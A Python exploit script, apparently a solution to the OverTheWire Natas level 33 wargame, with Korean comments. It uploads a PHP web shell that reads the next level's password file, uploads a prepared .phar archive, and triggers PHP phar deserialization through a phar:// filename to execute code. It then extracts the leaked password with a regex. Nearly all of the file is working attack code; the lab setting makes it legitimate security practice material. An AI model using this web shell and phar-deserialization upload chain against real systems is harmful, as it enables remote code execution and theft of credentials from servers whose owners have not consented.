import requests
import sys
import re

boundary = "=" * 65

if len(sys.argv) != 2:
  print(boundary)
  print("[+] 아래 포멧을 지켜 실행")
  print(f"   python {sys.argv[0]} [natas33 비밀번호]")
  print(boundary)
  sys.exit()


url = "http://natas33.natas.labs.overthewire.org"
natas33_cred = sys.argv[1]

s = requests.Session()
s.auth = ("natas33", natas33_cred)

phar_path = r"C:\Users\82103\OneDrive\바탕 화면\pyth\natas_exploit\exploit.phar"
shell_path = "natas33_shell.php"
phar_name = "exploit.phar"  

# 업로드 파일 대상으로 익스플로잇
def file_upload_exploit(url, payload, ex_file):
  data = {"MAX_FILE_SIZE": 4096, "filename": payload}
  response = s.post(url, data=data, files=ex_file)
  return response.text

#해당 쉘 파일을 생성하고 파일이름을 변경 및 업로드
shell_payload = b'<?php system("cat /etc/natas_webpass/natas34"); ?>'
shell_file = {"uploadedfile": (shell_path, shell_payload, "application/octet-stream")}  
shell_res = file_upload_exploit(url, shell_path, shell_file)
if "uploaded to" in shell_res:
    print(boundary)  
    print("[+] 1단계 쉘 업로드 성공")
    print(boundary)
else:
    print(boundary) 
    print("[-] 1단계 쉘 업로드 실패")
    print(shell_res)
    print(boundary)



#미리 생성한 phar파일 읽어와서 업로드
with open(phar_path, "rb") as f:
  phar_file = {"uploadedfile": (phar_name, f, "application/octet-stream")}
  phar_res = file_upload_exploit(url, phar_name, phar_file)
  
if "uploaded to: /natas33/upload/exploit.phar" in phar_res:
    print("[+] 2단계 phar 업로드 성공")
    print(boundary)
else:
    print("[-] 2단계 phar 업로드 실패")
    print(phar_res)
    print(boundary)
  

# 해당 마지막 과정에 요청은 아무 파일이나 업로드해서 실행하면 앞에 과정에 의해서 비밀번호 노출
# 페이로드나 파일은 만들어서 읽어와도 되고 그냥 여기서 파일 제목 및 내용 추가해서 줘도됨
# .phar 파일에 manifest쪽에 실제 역직렬화 객체가 있고 포멧을 채우기 위해, 아래와 같이 그냥 더미 데이터 파일 추가 
dummy_name = "test.txt"
dummy_text = b"a"

trigger_payload = f"phar:///natas33/upload/{phar_name}/{dummy_name}" 
trigger_file = {"uploadedfile": (dummy_name, dummy_text, "text/plain")}
total_res = file_upload_exploit(url, trigger_payload, trigger_file)

# 비밀번호 출력
password = re.search(r"natas33_shell\.php <br>\s*([A-Za-z0-9]{32})", total_res)

if password:
  print(f"[+] 업로드 파일을 통한 트리거 성공")
  print(f"[+] natas34 비밀번호 ===> {password.group(1)}")
  print(boundary)
else:
  print("[-] 제대로 익스플로잇 되지 않았으니, 페이로드 확인하세요")
  print(total_res)
  print(boundary)  
